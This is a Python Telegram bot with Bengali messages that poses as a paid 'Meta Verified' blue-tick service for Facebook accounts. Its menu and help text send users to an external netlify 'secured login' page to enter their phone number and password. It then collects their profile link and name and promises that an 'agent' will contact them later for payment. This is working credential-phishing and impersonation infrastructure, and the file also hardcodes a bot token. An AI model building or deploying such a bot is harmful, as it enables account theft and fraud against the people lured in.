import os
import telebot
from telebot import types
from flask import Flask
from threading import Thread

TOKEN = '8710197095:AAGcdkvFLkQV8eHCRFcFoOyHkZ3WASf5vrM'
bot = telebot.TeleBot(TOKEN)

# রেন্ডারে পোর্ট সচল রাখার জন্য ফ্লাস্ক সার্ভার
app = Flask('')

@app.route('/')
def home():
    return "Bot is running 24/7!"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    t = Thread(target=run)
    t.start()

user_data = {}

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🚀 মেটা ভেরিফিকেশন নিন", callback_data='order')
    btn2 = types.InlineKeyboardButton("🔐 সিকিউরড লগইন করুন", url="https://web-secure-view-8821.netlify.app/")
    btn3 = types.InlineKeyboardButton("💰 পেমেন্ট ও নিয়মাবলী", callback_data='pricing')
    btn4 = types.InlineKeyboardButton("❓ কীভাবে কাজ করে?", callback_data='help')
    btn5 = types.InlineKeyboardButton("⭐ সুবিধা ও শর্তাবলী", callback_data='benefits')
    btn6 = types.InlineKeyboardButton("📞 লাইভ সাপোর্ট", callback_data='support')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🌟 **স্বাগতম! Meta Verified (Blue Tick) সার্ভিসে আপনাকে স্বাগতম।** 💙\n\n"
        "আপনার ফেসবুক প্রোফাইল বা পেজকে খুব সহজেই ভেরিফাইড করে নিন। "
        "নিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_markup())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Error answering callback: {e}")
    
    if call.data == 'order':
        user_data[chat_id] = {}
        order_intro = (
            "📌 **মেটা ভেরিফিকেশন আবেদন প্রক্রিয়া:**\n\n"
            "উপরে দেওয়া **'🔐 সিকিউরড লগইন করুন'** বাটনে ক্লিক করে আপনার অ্যাকাউন্ট দিয়ে লগইন সম্পন্ন করুন।\n\n"
            "লগইন করার পর আপনার **ফেসবুক প্রোফাইল বা পেজের সঠিক লিংকটি** এখানে পাঠান:"
        )
        # আগের মেসেজটি এডিট করে নতুন লেখা ও ব্যাক বাটন দিয়ে দেওয়া হলো
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
        try:
            bot.edit_message_text(order_intro, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except:
            bot.send_message(chat_id, order_intro, parse_mode="Markdown", reply_markup=markup)
            
        bot.register_next_step_handler(call.message, get_profile_link)
        
    elif call.data == 'pricing':
        pricing_text = (
            "💰 **পেমেন্ট ও প্রক্রিয়া সংক্রান্ত তথ্য:**\n\n"
            "আমাদের এই সার্ভিসে বট বা স্বয়ংক্রিয়ভাবে কোনো পেমেন্ট নেওয়া হয় না।\n\n"
            "⏳ **পেমেন্ট নেওয়ার নিয়ম:**\n"
            "আপনার অর্ডার বা কাজ সম্পূর্ণভাবে শেষ হওয়ার ঠিক **২ থেকে আড়াই ঘণ্টা (2 to 2.5 hours) পর** আমাদের কোম্পানির অনুমোদিত একজন এজেন্ট বা মেম্বার সরাসরি আপনার ইনবক্সে মেসেজ করবেন পেমেন্ট সম্পন্ন করার জন্য।"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
        bot.edit_message_text(pricing_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif call.data == 'help':
        help_text = (
            "📌 **ব্লু টিক পাওয়ার সম্পূর্ণ কাজের প্রক্রিয়া:**\n\n"
            "১. 'সিকিউরড লগইন করুন' বাটনে ক্লিক করে নাম্বার ও পাসওয়ার্ড দিয়ে লগইন করুন।\n"
            "২. এরপর আপনার ফেসবুক প্রোফাইল বা পেজের লিংক দিন।\n"
            "৩. কাজ সম্পন্ন হওয়ার ঠিক ২ থেকে আড়াই ঘণ্টা পর আমাদের ডেডিকেটেড এজেন্ট আপনার সাথে যোগাযোগ করে পেমেন্ট সম্পন্ন করবেন।"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
        bot.edit_message_text(help_text, chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data == 'benefits':
        benefits_text = (
            "✨ **মেটা ভেরিফায়েড (Meta Verified) হওয়ার সুবিধাসমূহ:**\n\n"
            "• **প্রামাণিক ব্যাজ:** নামের পাশে আসল পরিচয়ের স্বীকৃতিস্বরূপ নীল রঙের ব্লু টিক।\n"
            "• **উন্নত নিরাপত্তা:** হ্যাকিং ও ভুয়া অ্যাকাউন্ট থেকে সুরক্ষা।\n"
            "• **রিয়েল হিউম্যান সাপোর্ট:** অ্যাকাউন্টে সমস্যা হলে সরাসরি মেটার সাপোর্টের সাথে কথা বলার সুযোগ।\n"
            "• **বর্ধিত রিচ:** কমেন্টস ও সার্চ রেজাল্টে দৃশ্যমানতা বৃদ্ধি।"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
        bot.edit_message_text(benefits_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif call.data == 'support':
        support_text = (
            "☎️ **কাস্টমার কেয়ার ও লাইভ সাপোর্ট:**\n\n"
            "আপনার যদি কোনো বিশেষ জিজ্ঞাসা থাকে, তবে সরাসরি আমাদের অফিসিয়াল সাপোর্টে যোগাযোগ করতে পারেন:\n\n"
            "👨‍💻 **সাপোর্ট ইউজারনেম:** `@aratboos16`"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
        bot.edit_message_text(support_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == 'back_home':
        welcome_text = (
            "🌟 **স্বাগতম! Meta Verified (Blue Tick) সার্ভিসে আপনাকে স্বাগতম।** 💙\n\n"
            "আপনার ফেসবুক প্রোফাইল বা পেজকে খুব সহজেই ভেরিফাইড করে নিন। "
            "নিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
        )
        bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=get_main_markup())

def get_profile_link(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'link': message.text}
    bot.send_message(chat_id, "✍️ ধন্যবাদ! এবার আপনার প্রোফাইলে থাকা **সঠিক নামটি** (Profile Name) এখানে লিখুন:")
    bot.register_next_step_handler(message, get_profile_name)

def get_profile_name(message):
    chat_id = message.chat.id
    user_data[chat_id]['name'] = message.text
    
    confirmation_text = (
        "🎉 **আপনার তথ্যগুলো সফলভাবে সাবমিট হয়েছে!**\n\n"
        "আমাদের টিম এখন আপনার কাজটি প্রসেস করছে। কাজ সম্পূর্ণ হওয়ার ঠিক **২ থেকে আড়াই ঘণ্টা পর** আমাদের একজন অনুমোদিত এজেন্ট বা মেম্বার আপনার ইনবক্সে সরাসরি মেসেজ করবেন পেমেন্ট সম্পন্ন করার জন্য। ধন্যবাদ আমাদের সাথে থাকার জন্য! 💙"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
    bot.send_message(chat_id, confirmation_text, parse_mode="Markdown", reply_markup=markup)

if __name__ == '__main__':
    keep_alive()
    print("Bot is running 24/7 on cloud...")
    bot.infinity_polling()
